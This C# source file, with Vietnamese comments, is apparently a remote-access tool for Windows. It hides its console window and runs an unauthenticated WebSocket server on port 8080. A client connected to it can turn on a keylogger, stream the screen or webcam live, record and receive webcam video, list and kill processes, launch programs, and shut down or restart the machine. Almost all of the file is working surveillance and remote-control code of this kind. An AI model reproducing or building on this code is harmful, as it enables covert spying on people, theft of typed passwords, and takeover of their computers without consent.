// Program.cs (sửa lại thành WebSocket server chuẩn)
using Accord.Video.FFMPEG;
// AForge/Accord usings (giữ nguyên nếu cần)
using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    class Program
    {
        // Config
        static int port = 8080;

        // Keylogger
        static StringBuilder keyBuffer = new StringBuilder();
        static object keyLogLock = new object();
        static bool isRecording = false;
        WebSocket globalWS = null;

        // Stream control
        static bool isStreaming = true;

        // WebSocket for the currently-connected client (single client scenario)
        // If bạn muốn nhiều client, đổi thành List<WebSocket>
        static WebSocket currentWs = null;
        static CancellationTokenSource streamingCts = null;
        static WebcamForm webcamForm = null;
        enum StreamMode{Screen,Webcam}
        static StreamMode currentStreamMode = StreamMode.Screen;
        static VideoCaptureDevice webcam;
        static Bitmap lastWebcamFrame;
        static object webcamLock = new object();
        static bool isRecordingWebcam = false;
        static VideoFileWriter recWriter;
        static DateTime recStartTime;
        static string recPath;
        static Stopwatch recWatch = new Stopwatch();

        static bool recStarted = false;
        static TimeSpan recDuration = TimeSpan.Zero;
        static int recTargetSeconds = 0;

        // P/Invoke
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("kernel32.dll")] private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")] private static extern bool SetProcessDPIAware();

        [STAThread]
        static async Task Main(string[] args)
        {
            // Optional: make DPI-aware for correct full-screen capture sizes
            try { SetProcessDPIAware(); } catch { }

            // Hide console if you want
            try { ShowWindow(GetConsoleWindow(), 0); } catch { }

            // Start keylogger thread (kept from your code)
            Thread keylogThread = new Thread(KeyloggerLoop) { IsBackground = true };
            keylogThread.SetApartmentState(ApartmentState.STA);
            keylogThread.Start();

            // Start WebSocket server
            string prefix = $"http://+:{port}/";
            var listener = new HttpListener();
            listener.Prefixes.Add(prefix);
            listener.Start();
            Console.WriteLine($"WebSocket server listening on ws://localhost:{port}/");

            while (true)
            {
                var ctx = await listener.GetContextAsync();
                if (ctx.Request.IsWebSocketRequest)
                {
                    _ = HandleWsClient(ctx); // fire-and-forget
                }
                else
                {
                    ctx.Response.StatusCode = 400;
                    ctx.Response.Close();
                }
            }
        }

        static async Task HandleWsClient(HttpListenerContext ctx)
        {
            WebSocket ws = (await ctx.AcceptWebSocketAsync(null)).WebSocket;
            Console.WriteLine("Client connected (WebSocket).");

            // set currentWs to this socket (single-client mode)
            currentWs = ws;

            // ensure streaming cancellation token reset
            streamingCts?.Cancel();
            streamingCts = new CancellationTokenSource();

            // Start streaming loop (auto start)
            _ = StartStreamingLoop(ws, streamingCts.Token);

            var buffer = new byte[8192];

            try
            {
                while (ws.State == WebSocketState.Open)
                {
                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
                        break;
                    }

                    // Assume text messages are commands (your HTML sends text)
                    if (result.MessageType == WebSocketMessageType.Text)
                    {
                        string msg = Encoding.UTF8.GetString(buffer, 0, result.Count);
                        await HandleCommand(ws, msg);
                    }
                    else if (result.MessageType == WebSocketMessageType.Binary)
                    {
                        // If you ever want to receive binary frames from client
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("WS client error: " + ex.Message);
            }

            // cleanup
            try
            {
                streamingCts?.Cancel();
            }
            catch { }
            currentWs = null;
            Console.WriteLine("Client disconnected.");
        }

        static async Task HandleCommand(WebSocket ws, string msg)
        {
            try
            {
                if (msg == "STOP_STREAM")
                {
                    isStreaming = false;
                    await SendText(ws, "SYS|Stream stopped");
                }
                else if (msg == "RESUME_STREAM")
                {
                    isStreaming = true;
                    await SendText(ws, "SYS|Stream resumed");
                }
                else if (msg == "LIST_APPS")
                {
                    await SendText(ws, "LIST_APPS|" + GetRunningApps());
                }
                else if (msg == "LIST_PROCS")
                {
                    await SendText(ws, "LIST_PROCS|" + GetProcesses());
                }
                else if (msg.StartsWith("START|"))
                {
                    string name = msg.Split('|')[1].Trim();
                    bool opened = false;

                    try { Process.Start(name); opened = true; } catch { }

                    if (!opened)
                    {
                        try { Process.Start(name + ".exe"); opened = true; } catch { }
                    }

                    if (!opened)
                    {
                        string[] searchPaths = {
            Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu),
            Environment.GetFolderPath(Environment.SpecialFolder.StartMenu),
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
        };

                        foreach (string path in searchPaths)
                        {
                            if (opened) break;
                            if (Directory.Exists(path))
                            {
                                try
                                {
                                    string[] files = Directory.GetFiles(path, "*" + name + "*.lnk", SearchOption.AllDirectories);
                                    if (files.Length > 0)
                                    {
                                        Process.Start(files[0]);
                                        opened = true;
                                    }
                                }
                                catch { }
                            }
                        }
                    }

                    if (opened) await SendText(ws, "KEYLOG|Đã mở thành công: " + name);
                    else await SendText(ws, "KEYLOG|Lỗi: Không tìm thấy ứng dụng '" + name + "' trong hệ thống.");
                }

                else if (msg == "SCREENSHOT")
                {
                    CaptureScreen();
                }
                else if (msg.StartsWith("KILL|"))
                {
                    try
                    {
                        Process.GetProcessById(int.Parse(msg.Split('|')[1])).Kill();
                    }
                    catch { }
                }
                else if (msg == "KEYLOG_START")
                {
                    lock (keyLogLock) { keyBuffer.Clear(); }
                    isRecording = true;
                    await SendText(ws, "KEYLOG|Keylogger Started...");
                }
                else if (msg == "KEYLOG_STOP")
                {
                    isRecording = false;
                    string logs = "";
                    lock (keyLogLock)
                    {
                        logs = keyBuffer.ToString();
                        keyBuffer.Clear();
                    }
                    if (logs.Length > 0) await SendText(ws, "KEYLOG|" + logs);
                    else await SendText(ws, "KEYLOG|(Trống)");
                }
                else if (msg == "WEBCAM_START")
                {
                    await SendText(ws, "SYS|REC_START");
                    _ = StartWebcamRec(11, ws); // quay 10s, không block
                }

                else if (msg == "STOP_STREAM")
                {
                    isStreaming = false;
                    byte[] black = CreateBlackJpeg();
                    string b64 = Convert.ToBase64String(black);
                    await SendText(ws, "LIVE|" + b64);

                    await SendText(ws, "SYS|STREAM_STOPPED");
                }
                else if (msg == "RESUME_STREAM")
                {
                    isStreaming = true;

                    // nếu chưa có CTS hoặc đã bị cancel thì tạo mới
                    if (streamingCts == null || streamingCts.IsCancellationRequested)
                        streamingCts = new CancellationTokenSource();

                    // Khởi chạy lại stream loop
                    _ = StartStreamingLoop(ws, streamingCts.Token);

                    await SendText(ws, "SYS|STREAM_RESUMED");
                }
                else if (msg == "DISCONNECT")
                {
                    try
                    {
                        // Stop streaming if running
                        isStreaming = false;
                        if (streamingCts != null)
                        {
                            streamingCts.Cancel();
                            streamingCts.Dispose();
                            streamingCts = null;
                        }

                        await SendText(ws, "SYS|DISCONNECTED");

                        // Close WebSocket safely
                        if (ws.State == WebSocketState.Open)
                        {
                            await ws.CloseAsync(
                                WebSocketCloseStatus.NormalClosure,
                                "Client requested disconnect",
                                CancellationToken.None
                            );
                        }
                    }
                    catch
                    {
                        // ignore
                    }
                }
                else if (msg == "SHUTDOWN")
                {
                    Process.Start("shutdown", "/s /t 0");
                    await SendText(ws, "LOG: Đang tắt...");
                }
                else if (msg == "RESTART")
                {
                    Process.Start("shutdown", "/r /t 0");
                    await SendText(ws, "LOG: Đang khởi động lại...");
                }
                else if (msg == "STREAM_WEBCAM")
                {
                    currentStreamMode = StreamMode.Webcam;
                    await SendText(ws, "SYS|STREAM_WEBCAM");
                }
                else if (msg == "STREAM_SCREEN")
                {
                    currentStreamMode = StreamMode.Screen;
                    await SendText(ws, "SYS|STREAM_SCREEN");
                }


                else
                {
                    // unknown command
                    await SendText(ws, "ERR|Unknown command");
                }

            }
            catch (Exception ex)
            {
                await SendText(ws, "ERR|" + ex.Message);
            }
        }

        static async Task SendText(WebSocket ws, string text)
        {
            if (ws == null || ws.State != WebSocketState.Open) return;
            byte[] data = Encoding.UTF8.GetBytes(text);
            await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
        }

        // Streaming loop: sends LIVE|base64 frames to the provided websocket while connected.
        static async Task StartStreamingLoop(WebSocket ws, CancellationToken ct)
        {
            Console.WriteLine("Start streaming loop.");

            while (!ct.IsCancellationRequested && ws != null && ws.State == WebSocketState.Open)
            {
                try
                {
                    if (isStreaming)
                    {
                        byte[] img;

                        if (currentStreamMode == StreamMode.Screen)
                        {
                            img = CaptureScreenBytes();
                        }
                        else
                        {
                            img = CaptureWebcamBytes();
                        }

                        await SendText(ws, "LIVE|" + Convert.ToBase64String(img));

                    }

                    else
                    {
                        // gửi khung đen mỗi ~300ms để xóa hình cũ
                        byte[] black = CreateBlackJpeg();
                        string b64 = Convert.ToBase64String(black);
                        await SendText(ws, "LIVE|" + b64);

                        await Task.Delay(300, ct);
                        continue;
                    }
                }
                catch
                {
                    // ignore transient errors
                }

                await Task.Delay(100, ct); // 10 FPS
            }

            Console.WriteLine("Streaming loop ended.");
        }

        static byte[] CaptureScreenBytes()
        {
            Rectangle bounds = SystemInformation.VirtualScreen;
            using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
            using (Graphics g = Graphics.FromImage(bmp))
            using (MemoryStream ms = new MemoryStream())
            {
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg); // jpeg smaller
                return ms.ToArray();
            }
        }

        static byte[] blackCache = null;
        static byte[] CreateBlackJpeg()
        {
            if (blackCache != null) return blackCache;
            using (Bitmap bmp = new Bitmap(800, 600))
            using (Graphics g = Graphics.FromImage(bmp))
            using (MemoryStream ms = new MemoryStream())
            {
                g.Clear(Color.Black);
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                blackCache = ms.ToArray();
                return blackCache;
            }
        }

        // Keylogger loop (giữ nguyên từ bạn)
        static void KeyloggerLoop()
        {
            bool[] keyState = new bool[256];
            while (true)
            {
                Thread.Sleep(10);
                for (int i = 8; i < 255; i++)
                {
                    try
                    {
                        bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                        if (isDown && !keyState[i])
                        {
                            if (isRecording)
                            {
                                bool shift = (GetKeyState(0x10) & 0x8000) != 0;
                                bool caps = (GetKeyState(0x14) & 0x0001) != 0;
                                bool upper = shift ^ caps;

                                lock (keyLogLock)
                                {
                                    if (i >= 65 && i <= 90) keyBuffer.Append(upper ? ((char)i).ToString() : ((char)i).ToString().ToLower());
                                    else if (i >= 48 && i <= 57) keyBuffer.Append(shift ? "!@#$%^&*()"[i - 48].ToString() : ((char)i).ToString());
                                    else if (i == 32) keyBuffer.Append(" ");
                                    else if (i == 13) keyBuffer.Append(Environment.NewLine);
                                    else if (i == 8 && keyBuffer.Length > 0) keyBuffer.Length--;
                                    else if (i == 190 || i == 110) keyBuffer.Append(".");
                                    else if (i == 188) keyBuffer.Append(",");
                                }
                            }
                            keyState[i] = true;
                        }
                        else if (!isDown && keyState[i]) keyState[i] = false;
                    }
                    catch { }
                }
            }
        }

        // Helper process lists
        static string GetRunningApps()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                foreach (Process p in Process.GetProcesses())
                    if (p.MainWindowHandle != IntPtr.Zero && !string.IsNullOrEmpty(p.MainWindowTitle))
                        sb.Append(p.Id + "|||" + p.MainWindowTitle + " [" + p.ProcessName + "];");
            }
            catch { }
            return sb.ToString();
        }

        static string GetProcesses()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                foreach (Process p in Process.GetProcesses())
                    sb.Append(p.Id + "|||" + p.ProcessName + ";");
            }
            catch { }
            return sb.ToString();
        }

        // Keep your CaptureScreen (dialog) if you still want to use it
        public static void CaptureScreen()
        {
            Thread t = new Thread(() =>
            {
                Rectangle bounds = SystemInformation.VirtualScreen;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                    using (SaveFileDialog save = new SaveFileDialog())
                    {
                        save.Filter = "PNG Files (*.png)|*.png|JPEG Files (*.jpg)|*.jpg";
                        save.FilterIndex = 1;
                        if (save.ShowDialog() == DialogResult.OK)
                        {
                            var format = save.FilterIndex == 1 ?
                                          System.Drawing.Imaging.ImageFormat.Png :
                                          System.Drawing.Imaging.ImageFormat.Jpeg;
                            bmp.Save(save.FileName, format);
                            MessageBox.Show("Ảnh đã được lưu tại: " + save.FileName);
                        }
                    }
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }

        public static async Task StartWebcamRec(int seconds, WebSocket ws)
        {
            InitWebcam();

            recTargetSeconds = seconds;
            recPath = Path.Combine(Path.GetTempPath(), $"rec_{DateTime.Now.Ticks}.avi");
            recWriter = new VideoFileWriter();

            isRecordingWebcam = true;

            // đợi đến khi rec tự stop
            while (isRecordingWebcam)
                await Task.Delay(50);

            recWriter.Close();
            recWriter.Dispose();

            byte[] bytes = File.ReadAllBytes(recPath);
            await SendText(ws, "VID|" + Convert.ToBase64String(bytes));
            File.Delete(recPath);
        }
        static void InitWebcam()
        {
            if (webcam != null && webcam.IsRunning)
                return;

            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (devices.Count == 0)
                throw new Exception("Không tìm thấy webcam");

            webcam = new VideoCaptureDevice(devices[0].MonikerString);

            webcam.NewFrame += (s, e) =>
            {
                Bitmap frame = (Bitmap)e.Frame.Clone();

                lock (webcamLock)
                {
                    lastWebcamFrame?.Dispose();
                    lastWebcamFrame = (Bitmap)frame.Clone();
                }

                // ghi video nếu đang REC
                if (isRecordingWebcam && recWriter != null)
                {
                    try
                    {
                        if (!recWriter.IsOpen)
                        {
                            int w = frame.Width;
                            int h = frame.Height;
                            if (w % 2 != 0) w--;
                            if (h % 2 != 0) h--;

                            recWriter.Open(recPath, w, h, 30, VideoCodec.MPEG4);
                            recWatch.Restart();
                            recStarted = false;
                        }

                        // FRAME ĐẦU → BẮT ĐẦU TÍNH GIỜ
                        if (!recStarted)
                        {
                            recStarted = true;
                            recWatch.Restart();
                        }

                        recDuration = recWatch.Elapsed;

                        if (recDuration <= TimeSpan.FromSeconds(recTargetSeconds))
                        {
                            recWriter.WriteVideoFrame(frame, recDuration);
                        }
                        else
                        {
                            isRecordingWebcam = false;
                        }
                    }
                    catch { }
                }


                frame.Dispose();
            };

            webcam.Start();
        }

        static byte[] CaptureWebcamBytes()
        {
            InitWebcam();

            lock (webcamLock)
            {
                if (lastWebcamFrame == null)
                    return CreateBlackJpeg();

                using (MemoryStream ms = new MemoryStream())
                {
                    lastWebcamFrame.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }


    }
}
